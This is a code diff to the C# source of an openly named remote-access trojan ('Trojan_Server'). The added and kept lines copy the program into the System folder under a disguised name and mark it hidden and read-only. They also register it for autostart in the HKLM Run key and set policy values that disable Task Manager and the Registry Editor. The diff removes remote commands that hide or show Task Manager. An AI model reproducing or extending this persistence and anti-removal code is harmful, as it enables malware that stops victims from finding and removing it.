@@ -121,12 +121,6 @@ namespace Trojan_Server
                             ShowWindow(FindWindow("Progman", "Program Manager"), 1);
                             Log("Show Desktop!", "COMMAND");
                             break;
-						case "HIDETASKMANGER":
-                            ShowWindow(FindWindow("taskmgr", "Task Manager"), 0);
-                            break;
-                        case "SHOWTASKMANGER":
-                            ShowWindow(FindWindow("taskmgr", "Task Manager"), 1);
-                            break;
                     }
                 }
                 catch
@@ -171,15 +165,16 @@ namespace Trojan_Server
                 File.SetAttributes(Environment.GetFolderPath(Environment.SpecialFolder.System) + "\\logonassistant.exe", FileAttributes.ReadOnly);
                 Log("File made to System, Hidden and Readonly!", "DEBUG");
                 Log("Trying to make Startup Key!", "DEBUG");
-                RegistryKey k = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", true);
-                k.SetValue("logonassist", "C:\\Windows\\SysWOW64\\logonassistant.exe", RegistryValueKind.String);
-                k.Close();
+	                RegistryKey k = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", true);
+	                k.SetValue("logonassist", "C:\\Windows\\SysWOW64\\logonassistant.exe", RegistryValueKind.String);
+	                k.Close();
                 Log("Startup RegistryKey angelegt!", "DEBUG");
                 Log("Trying to make DisableTaskMgr Key", "DEBUG");
                 RegistryKey objRegistryKey = Registry.CurrentUser.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\System");
-                objRegistryKey.SetValue("DisableTaskMgr", "1");
+                objRegistryKey.SetValue("DisableTaskMgr", "1", RegistryValueKind.DWord);
+                objRegistryKey.SetValue("DisableRegistryTools", "1", RegistryValueKind.DWord);
                 objRegistryKey.Close();
-                Log("DisableTaskMgr enabled!", "DEBUG");
+                Log("TaskManager disabled!", "DEBUG");
             }
             catch
             {
